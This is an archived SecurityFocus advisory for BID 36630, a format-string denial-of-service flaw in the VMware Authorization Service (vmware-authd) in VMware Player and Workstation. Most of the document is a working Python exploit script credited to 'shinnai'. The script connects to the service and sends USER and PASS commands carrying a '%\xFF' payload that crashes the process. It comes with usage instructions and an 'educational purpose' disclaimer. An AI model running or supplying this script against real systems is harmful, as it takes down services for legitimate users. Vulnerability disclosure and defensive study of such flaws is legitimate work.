source: http://www.securityfocus.com/bid/36630/info

VMware Player and Workstation are prone to a remote denial-of-service vulnerability because the applications fail to perform adequate validation checks on user-supplied input.

An attacker can exploit this issue to crash the 'vmware-authd' process, denying service to legitimate users.

NOTE: This issue was also covered in BID 39345 (VMware Hosted Products VMSA-2010-0007 Multiple Remote and Local Vulnerabilities); this BID is being retained to properly document the issue.

# ----------------------------------------------------------------------------
# VMware Authorization Service <= 2.5.3 (vmware-authd.exe) Format String DoS
# url: http://www.vmware.com/
#
# author: shinnai
# mail: shinnai[at]autistici[dot]org
# site: http://www.shinnai.net
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# Tested on Windows XP Professional Ita SP3 full patched
# ----------------------------------------------------------------------------

# usage: C:\>exploit.py 127.0.0.1 912

import socket
import time
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    conn = s.connect((host, port))
    d = s.recv(1024)
    print "Server <- " + d

    s.send('USER \x25\xFF \r\n')
    print 'Sending command "USER" + evil string...'
    d = s.recv(1024)
    print "Server response <- " + d

    s.send('PASS \x25\xFF \r\n')
    print 'Sending command "PASS" + evil string...'
    try:
        d = s.recv(1024)
        print "Server response <- " + d
    except:
        print "\nExploit completed..."
except:
    print "Something goes wrong honey..."